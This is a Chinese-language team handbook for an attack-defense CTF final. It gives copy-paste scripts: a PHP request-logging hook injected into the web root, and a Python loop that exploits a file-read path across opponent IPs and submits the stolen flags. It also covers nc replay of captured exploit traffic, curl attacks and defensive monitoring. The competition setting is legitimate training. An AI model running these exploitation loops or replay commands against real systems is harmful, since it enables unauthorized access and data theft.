# RE:HACK (iHACK26) 决赛唯一总手册（浏览器版 Pwnbox 直接复制粘贴）

---
find / -path /proc -prune -o -path /sys -prune -o -path /dev -prune -o -type f -size -1M -exec grep -lIE '(^|[^A-Z0-9])[A-Z0-9]{31}=' {} + 2>/dev/null

## ⚡ 明天上场最快用的 2 个极简脚本（直接复制到浏览器 Pwnbox 终端）

> **浏览器版 Pwnbox（类似 HTB Pwnbox）怎么从自己电脑复制粘贴进去？**
> 1. 在自己电脑复制下面的代码（`Ctrl + C`）。
> 2. 点击浏览器 Pwnbox **屏幕最左边的小箭头/侧边栏**，打开 **Clipboard（剪贴板框）**，把代码粘贴进那个框里（`Ctrl + V`）。
> 3. 回到 Pwnbox 里面的黑色终端窗口，按 **`Ctrl + Shift + V`**（或者鼠标右键 -> `Paste`），整段脚本就会自动生成好！

### 脚本 A：纯 Web Log 实时监控脚本（在【自己靶机】SSH 终端粘贴运行）
直接复制下面整段粘贴进靶机终端回车，就会实时把所有 **Apache / Nginx 访问日志 + 别人发过来的 GET/POST 参数** 滚动显示在屏幕上：

```bash
cat << 'EOF' > /tmp/monitor.sh
#!/bin/bash
WEB_DIR="${1:-/var/www/html}"
touch /tmp/web_post.log && chmod 666 /tmp/web_post.log

cat << 'PHPEOF' > /tmp/hook.php
<?php
@error_reporting(0);
$raw = @file_get_contents("php://input");
$line = date("H:i:s") . " [IP:" . $_SERVER["REMOTE_ADDR"] . "] " . $_SERVER["REQUEST_METHOD"] . " " . $_SERVER["REQUEST_URI"];
if (!empty($_POST)) $line .= " POST:" . json_encode($_POST, JSON_UNESCAPED_SLASHES);
if (!empty($raw))   $line .= " RAW:" . substr($raw, 0, 500);
@file_put_contents("/tmp/web_post.log", $line . "\n", FILE_APPEND);
?>
PHPEOF
chmod 644 /tmp/hook.php

if [ -d "$WEB_DIR" ]; then
    grep -q "hook.php" "$WEB_DIR/.htaccess" 2>/dev/null || echo "php_value auto_prepend_file /tmp/hook.php" >> "$WEB_DIR/.htaccess"
    grep -q "hook.php" "$WEB_DIR/.user.ini" 2>/dev/null || echo "auto_prepend_file=/tmp/hook.php" >> "$WEB_DIR/.user.ini"
    [ -w "$WEB_DIR/index.php" ] && (grep -q "hook.php" "$WEB_DIR/index.php" || sed -i '1i <?php @include_once("/tmp/hook.php"); ?>' "$WEB_DIR/index.php")
fi

echo "=== 正在实时监控所有 Web Log (按 Ctrl+C 停止) ==="
tail -f /tmp/web_post.log /var/log/apache2/*access*.log /var/log/nginx/*access*.log /var/log/httpd/*access*.log 2>/dev/null
EOF
bash /tmp/monitor.sh
```

---

### 脚本 B：极简打全场 + 官方 `PUT /flags` 自动交 Flag 脚本（在【Pwnbox】终端粘贴）
复制下面整段粘贴进 Pwnbox 终端生成 `sub.py`，等下找到 `FLAG_PATH`（靶机存 flag 的位置）和漏洞路径后，用 `mousepad sub.py` 改最上面那几行即可全自动跑：

```bash
cat << 'EOF' > sub.py
import json, re, socket, time, requests

# ==================== 等下找到了直接填这几个空位 ====================
TOKEN     = "<submit token>"          # 1. 填你们队的 submit token
HOST      = "<gameserver>"            # 2. 填 gameserver 的 IP
IPS       = [f"10.10.1.{i}" for i in range(1, 16) if i != 5]  # 3. 改队伍IP范围(跳过自己)
PORT      = 80                        # 4. 题目 Web 端口

FLAG_PATH = "/flag"                   # <--- 5. 等下找到靶机 flag 路径填这里 (如 /flag 或 /var/www/flag.txt)
VULN_PATH = f"/about.php?file={FLAG_PATH}"  # <--- 6. 填漏洞网页路径

# 如果是 GET 攻击就留 POST_DATA = None；如果是 POST 就填字典如 {"cmd": f"cat {FLAG_PATH}"}
POST_DATA = None
# POST_DATA = {"cmd": f"cat {FLAG_PATH}"}
# ====================================================================

def submit_flags(flag_list):
    if not flag_list: return
    body = json.dumps(list(flag_list))
    req = (
        f"PUT /flags HTTP/1.1\r\n"
        f"Host: {HOST}\r\n"
        f"X-Team-Token: {TOKEN}\r\n"
        f"Content-Type: application/json\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n\r\n"
        f"{body}"
    )
    try:
        with socket.create_connection((HOST, 80), timeout=10) as s:
            s.sendall(req.encode())
            print("[+] 提交结果:", s.recv(4096).decode(errors="replace").splitlines()[-1])
    except Exception as e:
        print("[!] 提交失败:", e)

submitted = set()
while True:
    start_t = time.time()
    print(f"\n=== 新一轮攻击 ({time.strftime('%H:%M:%S')}) ===")
    for ip in IPS:
        url = f"http://{ip}:{PORT}{VULN_PATH}"
        try:
            r = requests.get(url, timeout=3) if POST_DATA is None else requests.post(url, data=POST_DATA, timeout=3)
            for flg in re.findall(r"(?:[A-Z0-9]{31}=|ihack26\{[^}]+\})", r.text):
                if flg not in submitted:
                    print(f"[+] 抓到 {ip} 新 Flag: {flg}")
                    submitted.add(flg)
                    open("flags.txt", "a").write(flg + "\n")
                    submit_flags([flg])  # 抓到立刻提交，防 2 分钟过期！
        except Exception as e:
            print(f"[-] {ip} 错误: {e}")
        time.sleep(2.5)  # 强制合规：每打一家停 2.5 秒 (>= 2秒)
    wait_s = max(5, int(120 - (time.time() - start_t)))
    print(f"[*] 休息 {wait_s} 秒对齐下一个 2 分钟新 Flag...")
    time.sleep(wait_s)
EOF
```
* 修改里面前 3 行：在 Pwnbox 终端敲 `mousepad sub.py`（会弹出像记事本一样的图形界面编辑器！），改好保存后敲 `python3 sub.py` 即可全自动跑！

---

## 一、 出发去 UiTM 前必带物品清单

### 1. 硬件设备（现场只给 1 根网线 + 1 个插座！）
* [ ] **小型路由器 (Router) 或交换机 × 1**：把官方给的唯一 1 根网线插在路由器 WAN 口，你们 3 台电脑连自己的路由器。
* [ ] **短网线 (RJ45) × 4 + USB/Type-C 转网口转换器**：连自己的路由器。
* [ ] **多孔长线排插 (Power Extension) × 2**：现场只有 1 个墙插，要供 3~4 台电脑 + 1 台路由器 + 显示器，至少需要 6~8 个插孔。
* [ ] **外接显示器 (Monitor) + HDMI 线 × 1~2**：专门用来全屏挂 Wireshark 和计分板。

### 2. 赛前提前下载并带进 Pwnbox 的文件
直接把当前文件夹（以及下面两个 Phase 1 常用工具）传到你们的 GitHub 或打包带进 Pwnbox：
1. **本目录的 `scripts/` 文件夹（已按 `0 -> 5` 编号，不用改代码直接跑）**：
   * **赛前配置（在 Pwnbox 开局只跑 1 次）**：
     * [scripts/0_set_teams.py](file:///f:/utem/CTF_AWD/scripts/0_set_teams.py)（一键生成全场队伍 IP 列表 `targets.txt` 并保存 Token，后面的 3/4/5 脚本会自动读取！）
   * **防守端（放自己靶机）**：
     * [scripts/1_defense_init.sh](file:///f:/utem/CTF_AWD/scripts/1_defense_init.sh)（靶机一键备份源码 + 查后门 + 后台抓包）
     * [scripts/2_php_logger.php](file:///f:/utem/CTF_AWD/scripts/2_php_logger.php)（PHP 抓攻击包与真 Flag 泄露报警器）
   * **攻击端（放 Pwnbox，自动读取 `0_set_teams.py` 存好的 IP 和 Token）**：
     * [scripts/3_web_get_attack.py](file:///f:/utem/CTF_AWD/scripts/3_web_get_attack.py)（专门打 **Web GET** 请求 + 自动交 Flag）
     * [scripts/4_web_post_attack.py](file:///f:/utem/CTF_AWD/scripts/4_web_post_attack.py)（专门打 **Web POST** 请求 + 自动交 Flag）
     * [scripts/5_pwn_bin_attack.py](file:///f:/utem/CTF_AWD/scripts/5_pwn_bin_attack.py)（专门打 **Pwn `p.bin` 原始流量重放** + 自动交 Flag）
2. **Phase 1 额外推荐下载工具**（主办方已确认允许带入）：
   * `linpeas.sh`（Linux 提权扫描）：`https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh`
   * `RsaCtfTool`（密码学 RSA 自动解密）：`https://github.com/RsaCtfTool/RsaCtfTool`

---

## 二、 比赛期间 5 条保命红线（绝不违规）
1. **全程只在 Pwnbox 内操作，比赛开始后严禁打开任何 AI 工具**（赛前准备好的脚本可以直接用）。
2. **严禁扫描其他队伍**：千万别对别的队敲 `nmap`、`gobuster`、`ffuf`、`dirb`、`nikto`。
3. **严禁修改防火墙**：千万别敲 `iptables` 或 `ufw` 封 IP。
4. **自动化脚本延迟必须 `>= 2秒`**：我们的 `3_easy_attack.py` 已内置 `2.5秒` 延迟，完全合规。
5. **不准破坏别人靶机**：拿到权限只读 `/flag`，不要删别人的项目文件。

---

## 三、 比赛现场按顺序做这 4 步（零代码也能拿满分）

### 【第 1 步：开局保命】把防守脚本传进靶机并运行 `1_defense_init.sh`
1. 在 **Pwnbox 终端** 用 `scp` 一键把 `scripts` 文件夹传到你们自己的靶机 `/tmp` 目录：
```bash
scp -r ./scripts user@你的靶机IP:/tmp/
```
2. 登录你们自己的靶机，改密码并运行一键防守脚本：
```bash
ssh user@你的靶机IP
passwd
bash /tmp/scripts/1_defense_init.sh /var/www/html
```
它会自动帮你做完三件事：
1. 用 `git` 备份源码：
   * 平时每隔 5 分钟敲 `git status` 看有没有别人新传上来的木马文件（显示为 `?? xxx.php`）。
   * 一旦发现被篡改或被种木马，敲 **`git checkout -- . && git clean -fd`** 即可 **1秒恢复原状**！
2. 自动列出源码里的 `eval` / `system` 预留后门位置。
3. 自动在后台开启 `tcpdump` 循环抓包，并打印出你们本机当前的 `/flag` 真值。

---

### 【第 2 步：开启报警】抓别人打过来的攻击包（2 选 1）

#### 👉 方法 A：Wireshark 实时投屏（Web + Pwn 通用，不改任何文件）
在 **Pwnbox 终端** 敲这 1 行命令：
```bash
ssh user@你的靶机IP "tcpdump -i any -U -s0 -w - 'not port 22'" | wireshark -k -i -
```
* **怎么在几万个包里 3 秒抓到攻击包？**
  1. 直接在 Wireshark 顶部过滤栏输入：**`frame contains "ihack26"`**（或者先看自己靶机 `cat /flag` 的内容）。
  2. 对着搜出来的那一行包：**右键 -> Follow -> TCP Stream（或 HTTP Stream）**：
     * 🔴 **红色字（Client -> Server）** = **对手发给你的攻击 Payload（直接照抄这段！）**
     * 🔵 **蓝色字（Server -> Client）** = **你的靶机被攻破后吐出去的真 Flag (`ihack26{...}`)**

#### 👉 方法 B：如果是 PHP 网站，挂载 `2_php_logger.php`
把 [scripts/2_php_logger.php](file:///f:/utem/CTF_AWD/scripts/2_php_logger.php) 传到自己靶机的 `/tmp/2_php_logger.php`，在 `index.php` 第一行加上：
```php
<?php include_once('/tmp/2_php_logger.php'); ?>
```
然后在靶机终端盯屏：
```bash
tail -f /tmp/awd_confirmed_attacks.log
```
只要有人偷走你的真 Flag，屏幕上就会立刻弹出 `[CRITICAL: FLAG LEAKED IN RESPONSE!]` 以及他发送的完整路径和参数！

---

### 【第 3 步：反打全场 + 自动交 Flag】在 Pwnbox 选择对应脚本运行
当你从上面第 2 步看到了对手的 🔴 **红色字** 攻击内容后，**完全不需要改代码**，根据你抓到的类型直接运行对应的那个文件：

* **情况 1：抓到的是 Web GET 请求**（红字第一行是 `GET /index.php?cmd=...`）：
  ```bash
  python3 scripts/3_web_get_attack.py
  ```
* **情况 2：抓到的是 Web POST 请求**（红字第一行是 `POST /ping.php`，最底下有一行参数）：
  ```bash
  python3 scripts/4_web_post_attack.py
  ```
* **情况 3：抓到的是 Pwn 流量**（在 Wireshark 左下角选 `Client -> Server` 红字，右下角选 `Raw`，保存为 `p.bin`）：
  ```bash
  python3 scripts/5_pwn_bin_attack.py
  ```

运行后按照屏幕上的中文提示依次填入 **其他队伍 IP（如 `10.10.1.2-10`）**、**路径/参数** 和 **Token** 按回车，脚本就会每隔 `2.5 秒` 自动打一家并自动交 Flag！

---

### 【第 4 步：备用零代码手动打法】方向键 `↑` 改 IP（连脚本都不用跑）
如果你只想临时手动打一轮：
* **Web GET 题**：直接打开 Firefox 浏览器访问 `http://10.10.1.2/漏洞路径`，改网址里的 `.2` 为 `.3`、`.4` 挨个回车。
* **Web POST 题**：敲 `curl http://10.10.1.2/xxx.php -d "红字参数"`，按键盘方向键 `↑` 改 IP 挨个回车。
* **Pwn 静态题**：敲 `(cat p.bin; sleep 0.5; echo "cat /flag") | nc -w 2 10.10.1.2 9999`，按键盘方向键 `↑` 改 IP 挨个回车。（如果遇到吐 `0x7f...` 动态地址进不去命令行的复杂 Pwn 题，不会写代码就直接跳过攻击，专心打 Web 和守好自己的机器！）
